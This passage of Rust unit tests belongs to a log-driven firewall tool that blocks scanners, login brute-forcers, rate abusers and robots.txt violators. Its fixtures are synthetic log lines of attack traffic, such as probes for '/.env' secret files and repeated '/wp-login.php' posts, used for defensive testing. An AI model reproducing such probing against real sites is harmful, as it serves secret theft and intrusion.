        assert_eq!(rule.evidence.as_deref(), Some("requested /.env"));
    }

    /// The pipeline spends evidence when a block is made; an unblock by
    /// hand must hold even against evidence gathered while it stood.
    #[test]
    fn a_scheduled_pass_leaves_an_address_unblocked_by_hand_alone() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        probe_at(&db, "203.0.113.5", now - 60);
        run_detector(&db, Detector::ProbePaths, 1, now, false).unwrap();
        probe_at(&db, "203.0.113.5", now + 30);
        db.unblock_address("203.0.113.5").unwrap();

        let outcome = run_detector(&db, Detector::ProbePaths, 1, now + 60, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
        assert_eq!(outcome.skipped_unblocked, 1);
    }

    // ---- login brute force ----

    /// `n` POSTs to `/wp-login.php` from `ip`, `every` seconds apart, the
    /// last at `last`.
    fn login_posts(ip: &str, n: i64, every: i64, last: i64) -> Vec<String> {
        (0..n)
            .map(|i| {
                crate::testing::access_line_at(
                    ip,
                    "POST /wp-login.php HTTP/1.1",
                    200,
                    "Mozilla/5.0",
                    last - i * every,
                )
            })
            .collect()
    }

    /// From the log to the block, as the schedule runs it: twenty login
    /// attempts inside the hour block the address, and the block names
    /// the page.
    #[test]
    fn the_scheduled_login_detector_blocks_twenty_attempts_inside_its_hour() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        let lines = [
            login_posts("203.0.113.5", 20, 60, now - 60),
            login_posts("198.51.100.7", 19, 60, now - 60),
        ]
        .concat();
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::LoginAttempts, 1, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.5"], "{outcome:?}");
        assert_eq!(
            the_only_rule(&db).evidence.as_deref(),
            Some(
                "login attempts over the threshold, inside the window, the first to \
                 /wp-login.php"
            )
        );
    }

    /// Twenty attempts spread over a day are a team logging in, not a
    /// password being guessed.
    #[test]
    fn login_attempts_outside_the_hour_do_not_count() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        let lines = login_posts("203.0.113.5", 20, 3600, now - 60);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::LoginAttempts, 1, now, false).unwrap();

        assert_eq!(outcome.candidates, 0, "{outcome:?}");
    }

    #[test]
    fn the_login_detector_never_blocks_a_trusted_address() {
        let db = Db::open_in_memory().unwrap();
        db.trust_address("203.0.113.5").unwrap();
        let now = now_secs();
        let lines = login_posts("203.0.113.5", 30, 60, now - 60);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::LoginAttempts, 1, now, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
        assert_eq!(outcome.skipped_trusted, 1);
    }

    // ---- request rate ----

    /// `n` requests for `/` from `ip`, spread evenly over the hour before
    /// `end`, each answered `status`.
    fn hour_of_requests(ip: &str, n: i64, status: u16, end: i64) -> Vec<String> {
        (0..n)
            .map(|i| {
                crate::testing::access_line_at(
                    ip,
                    "GET / HTTP/1.1",
                    status,
                    "Mozilla/5.0",
                    end - 3600 + i * 3600 / n,
                )
            })
            .collect()
    }

    /// From the log to the block, as the schedule runs it: a rate kept up
    /// for the hour a fifth over the threshold (12 a minute here, so the
    /// log stays small) blocks, whatever the clock, and one under it does
    /// not; the block says how many requests it counted.
    #[test]
    fn the_scheduled_request_rate_blocks_a_rate_kept_up_for_the_hour() {
        let db = Db::open_in_memory().unwrap();
        Detector::RequestRate.set_enabled(&db, true).unwrap();
        Detector::RequestRate.set_threshold(&db, 12).unwrap();
        let now = now_secs();
        let lines = [
            hour_of_requests("203.0.113.5", 15 * 60, 200, now),
            hour_of_requests("198.51.100.7", 11 * 60, 200, now),
        ]
        .concat();
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RequestRate, 1, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.5"], "{outcome:?}");
        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
        assert!(
            evidence.ends_with("requests inside the window"),
            "evidence was: {evidence}"
        );
    }

    /// Forty addresses of one /24, six missing pages each: 240 probes,
    /// and nobody over the limit of seven.
    fn a_scan_spread_over_203_0_113(db: &Db, now: i64) {
        let lines: Vec<String> = (1..=40)
            .flat_map(|host| {
                (0..6).map(move |n| {
                    crate::testing::access_line_at(
                        &format!("203.0.113.{host}"),
                        &format!("GET /missing-{host}-{n} HTTP/1.1"),
                        404,
                        "Bot",
                        now - 300,
                    )
                })
            })
            .collect();
        crate::testing::ingest_access_lines(db, &lines, now);
    }

    #[test]
    fn with_escalation_on_a_scan_spread_over_a_subnet_blocks_the_subnet() {
        let db = Db::open_in_memory().unwrap();
        crate::protection::set_subnet_escalation(&db, Some(true), Some(3)).unwrap();
        let now = now_secs();
        a_scan_spread_over_203_0_113(&db, now);

        let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.0/24"], "{outcome:?}");
        let evidence = the_only_rule(&db).evidence.unwrap_or_default();
        assert!(
            evidence.contains("from 40 addresses"),
            "evidence was: {evidence}"
        );

        // And what earned the block is answered by it, as for one address.
        let again = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();
        assert_eq!(again.candidates, 0, "{again:?}");
    }

    /// Blocking 256 addresses is the operator's call, and off until made.
    #[test]
    fn with_escalation_off_a_scan_spread_over_a_subnet_blocks_nobody() {
        let db = Db::open_in_memory().unwrap();
        let now = now_secs();
        a_scan_spread_over_203_0_113(&db, now);

        let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
    }

    #[test]
    fn a_subnet_that_holds_a_verified_crawler_or_a_trusted_address_is_not_blocked_whole() {
        for exempt in ["crawler", "trusted"] {
            let db = Db::open_in_memory().unwrap();
            crate::protection::set_subnet_escalation(&db, Some(true), Some(3)).unwrap();
            match exempt {
                "crawler" => {
                    ipranges::store(
                        &db,
                        ipranges::IpRangeSourceKind::GoogleBot,
                        &["203.0.113.128/27".to_string()],
                    )
                    .unwrap();
                }
                _ => {
                    db.trust_address("203.0.113.200").unwrap();
                }
            }
            let now = now_secs();
            a_scan_spread_over_203_0_113(&db, now);

            let outcome = run_detector(&db, Detector::WebScanners, 1, now, false).unwrap();

            assert!(outcome.newly_blocked.is_empty(), "{exempt}: {outcome:?}");
        }
    }

    /// A client NGINX's rate limit keeps refusing is blocked however few
    /// requests it makes in all.
    #[test]
    fn the_scheduled_request_rate_blocks_a_client_refused_a_hundred_times() {
        let db = Db::open_in_memory().unwrap();
        Detector::RequestRate.set_enabled(&db, true).unwrap();
        let now = now_secs();
        // Inside the last ten minutes, so every one is in a bucket that
        // began inside the window.
        let lines: Vec<String> = (0..100)
            .map(|i| {
                let at = now - 300 + i;
                crate::testing::access_line_at("203.0.113.5", "GET / HTTP/1.1", 429, "Bot", at)
            })
            .collect();
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RequestRate, 1, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.5"], "{outcome:?}");
        assert_eq!(
            the_only_rule(&db).evidence.as_deref(),
            Some("100 requests refused with 429 inside the window")
        );
    }

    #[test]
    fn the_request_rate_never_blocks_a_verified_crawler() {
        let db = Db::open_in_memory().unwrap();
        Detector::RequestRate.set_enabled(&db, true).unwrap();
        Detector::RequestRate.set_threshold(&db, 12).unwrap();
        seed_googlebot_ranges(&db);
        let now = now_secs();
        let lines = hour_of_requests("66.249.66.1", 20 * 60, 200, now);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RequestRate, 1, now, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
        assert_eq!(outcome.skipped_known_crawlers, 1);
    }

    // ---- robots.txt violators ----

    /// `ip` as `user_agent` fetching robots.txt and then `path`, a minute
    /// apart, the second a minute before `now`.
    fn read_then_fetched(ip: &str, path: &str, user_agent: &str, now: i64) -> Vec<String> {
        let get = |path: &str, at| {
            let request = format!("GET {path} HTTP/1.1");
            crate::testing::access_line_at(ip, &request, 200, user_agent, at)
        };
        vec![get("/robots.txt", now - 120), get(path, now - 60)]
    }

    /// A host serving the generated robots.txt, with the detector on.
    fn serving_robots_txt() -> Db {
        let db = Db::open_in_memory().unwrap();
        db.set_serve_robots_txt(true).unwrap();
        Detector::RobotsViolators.set_enabled(&db, true).unwrap();
        db
    }

    /// From the log to the block, as the schedule runs it: the generated
    /// robots.txt forbids the trap path to everyone.
    #[test]
    fn the_scheduled_robots_detector_blocks_a_client_that_read_the_rules_and_ignored_them() {
        let db = serving_robots_txt();
        let now = now_secs();
        let lines = read_then_fetched("203.0.113.5", "/stop-bots-trap/x", "Firefox", now);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RobotsViolators, 7, now, false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.5"], "{outcome:?}");
        assert_eq!(
            the_only_rule(&db).evidence.as_deref(),
            Some("fetched robots.txt, then /stop-bots-trap/x, which it forbids")
        );
    }

    /// Without the generated robots.txt served there are no rules it
    /// knows were read.
    #[test]
    fn the_robots_detector_does_nothing_while_robots_txt_is_not_served() {
        let db = serving_robots_txt();
        db.set_serve_robots_txt(false).unwrap();
        let now = now_secs();
        let lines = read_then_fetched("203.0.113.5", "/stop-bots-trap/x", "Firefox", now);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RobotsViolators, 7, now, false).unwrap();

        assert_eq!(outcome.candidates, 0, "{outcome:?}");
    }

    #[test]
    fn the_robots_detector_never_blocks_a_verified_crawler() {
        let db = serving_robots_txt();
        seed_googlebot_ranges(&db);
        let now = now_secs();
        let lines = read_then_fetched("66.249.66.1", "/stop-bots-trap/x", "Googlebot/2.1", now);
        crate::testing::ingest_access_lines(&db, &lines, now);

        let outcome = run_detector(&db, Detector::RobotsViolators, 7, now, false).unwrap();

        assert!(outcome.newly_blocked.is_empty(), "{outcome:?}");
        assert_eq!(outcome.skipped_known_crawlers, 1);
    }

    // ---- an application's own clients ----

    /// A site whose HTTPS block passes to `upstream`, scanned from its
    /// port-80 redirect block, which comes first in the file.
    fn site_passing_to(dir: &std::path::Path, db: &Db, upstream: &str) {
        let config = dir.join("cloud.conf");
        std::fs::write(
            &config,
            format!(
                "server {{\n    listen 80;\n    server_name cloud.example.com;\n    \
                 return 301 https://$host$request_uri;\n}}\n\
                 server {{\n    listen 443 ssl;\n    server_name cloud.example.com;\n    \
                 location / {{\n        proxy_pass {upstream};\n    }}\n}}\n"
            ),
        )
        .unwrap();
        db.upsert_site("cloud.example.com", config.to_str().unwrap())
            .unwrap();
    }

    /// A hundred photos deleted elsewhere, and the phone asking after each.
    fn phone_catching_up() -> String {
        (0..100)
            .map(|i| {
                format!(
                    "203.0.113.5 - alice [10/Jul/2026:12:00:00 +0000] \
                     \"PROPFIND /remote.php/dav/files/alice/IMG_{i}.jpg HTTP/2.0\" 404 223 \
                     \"-\" \"Mozilla/5.0 (iOS) Nextcloud-iOS/35.0.0\" \"cloud.example.com\"\n"
                )
            })
            .collect()
    }

    #[test]
    fn block_web_scanners_leaves_a_nextcloud_client_alone() {
        let dir = tempfile::tempdir().unwrap();
        let db = Db::open_in_memory().unwrap();
        site_passing_to(dir.path(), &db, "http://nextcloud:80");

        let outcome = block_web_scanners(&db, 7, 1, &phone_catching_up(), false).unwrap();

        assert_eq!(outcome.candidates, 0, "{outcome:?}");
    }

    #[test]
    fn block_web_scanners_still_counts_those_404s_where_nextcloud_does_not_run() {
        let dir = tempfile::tempdir().unwrap();
        let db = Db::open_in_memory().unwrap();
        site_passing_to(dir.path(), &db, "http://calibre-web:8083");

        let outcome = block_web_scanners(&db, 7, 1, &phone_catching_up(), false).unwrap();

        assert_eq!(outcome.newly_blocked, ["203.0.113.5"]);
    }

    // ---- repeat offenders ----

    /// How long `address`'s live block was made for, in days.
    fn days_blocked(db: &Db, address: &str) -> i64 {
        let rules = db.list_firewall_rules().unwrap();
        let rule = rules
            .iter()
            .find(|r| r.address == address)
            .unwrap_or_else(|| panic!("{address} is not blocked; rules: {rules:?}"));
        let seconds = rule.expires_at.unwrap() - rule.created_at.unwrap();
        (seconds + 43_200) / 86_400
    }

    /// Blocks `address` for probing and lets that block lapse, `times`
    /// times over, each time from the same log line.
    fn probe_and_lapse(db: &Db, address: &str, times: usize) {
        let log = probe_line(address, "/.env");
        for _ in 0..times {
            block_probe_paths(db, 5, &log, false).unwrap();
            let id = db.list_firewall_rules().unwrap()[0].id;
            db.let_firewall_rule_lapse(id);
        }
    }

    #[test]
    fn a_second_block_after_the_first_expired_is_twice_as_long() {
        let db = Db::open_in_memory().unwrap();
        probe_and_lapse(&db, "203.0.113.9", 1);

        let outcome =
            block_probe_paths(&db, 5, &probe_line("203.0.113.9", "/.env"), false).unwrap();

        assert_eq!(days_blocked(&db, "203.0.113.9"), 10);
        assert_eq!(
            outcome.repeat_offenders,
            [RepeatOffender {
                address: "203.0.113.9".to_string(),
                offence: 2,
                ttl_days: 10
            }]
        );
    }

    #[test]
    fn the_fourth_block_and_after_are_eight_times_as_long() {
        let db = Db::open_in_memory().unwrap();
        probe_and_lapse(&db, "203.0.113.9", 4);

        block_probe_paths(&db, 5, &probe_line("203.0.113.9", "/.env"), false).unwrap();

        assert_eq!(days_blocked(&db, "203.0.113.9"), 40, "the fifth block");
    }

    /// Finding an address already blocked is not a new offence: a
    /// scanner that carries on while blocked has not been caught twice.
    #[test]
    fn finding_an_address_still_blocked_is_not_an_offence() {
        let db = Db::open_in_memory().unwrap();
        let log = probe_line("203.0.113.9", "/.env");
        block_probe_paths(&db, 5, &log, false).unwrap();
        block_probe_paths(&db, 5, &log, false).unwrap();

        assert_eq!(db.offences_before("203.0.113.9", now_secs()).unwrap(), 1);
    }

    #[test]
    fn with_escalation_off_a_repeat_offender_gets_the_detector_s_ttl() {
        let db = Db::open_in_memory().unwrap();
        crate::protection::set_repeat_escalation(&db, false).unwrap();
        probe_and_lapse(&db, "203.0.113.9", 1);

        let outcome =
            block_probe_paths(&db, 5, &probe_line("203.0.113.9", "/.env"), false).unwrap();

        assert_eq!(days_blocked(&db, "203.0.113.9"), 5);
        assert!(outcome.repeat_offenders.is_empty(), "{outcome:?}");
        assert_eq!(
            db.offences_before("203.0.113.9", now_secs()).unwrap(),
            2,
            "still counted, so switching escalation on has a history"
        );
    }

    #[test]
    fn a_dry_run_says_how_long_but_records_no_offence() {
        let db = Db::open_in_memory().unwrap();
        probe_and_lapse(&db, "203.0.113.9", 1);

        let outcome = block_probe_paths(&db, 5, &probe_line("203.0.113.9", "/.env"), true).unwrap();

        assert_eq!(outcome.repeat_offenders[0].ttl_days, 10, "{outcome:?}");
        assert_eq!(db.offences_before("203.0.113.9", now_secs()).unwrap(), 1);
    }

    /// The two exemptions are checked before an offence is counted, so a
    /// trusted address or one logged in from never builds up a record.
    #[test]
    fn a_trusted_or_logged_in_address_gains_no_offence() {
        let db = Db::open_in_memory().unwrap();
        db.trust_address("203.0.113.9").unwrap();
        db.record_ssh_login_ips(&["203.0.113.10".to_string()])
            .unwrap();
        let log = probe_line("203.0.113.9", "/.env") + &probe_line("203.0.113.10", "/.env");

        block_probe_paths(&db, 5, &log, false).unwrap();

        for address in ["203.0.113.9", "203.0.113.10"] {
            assert_eq!(
                db.offences_before(address, now_secs()).unwrap(),
                0,
                "{address}"
            );
        }
    }

    /// An operator's unblock says the block was a mistake; the next one
    /// starts from the detector's own TTL again.
    #[test]
    fn unblocking_by_hand_forgets_the_offences() {
        let db = Db::open_in_memory().unwrap();
        probe_and_lapse(&db, "203.0.113.9", 2);
        block_probe_paths(&db, 5, &probe_line("203.0.113.9", "/.env"), false).unwrap();
        let id = db.list_firewall_rules().unwrap()[0].id;

        db.remove_firewall_rule(id).unwrap();

        assert_eq!(db.offences_before("203.0.113.9", now_secs()).unwrap(), 0);
    }
}
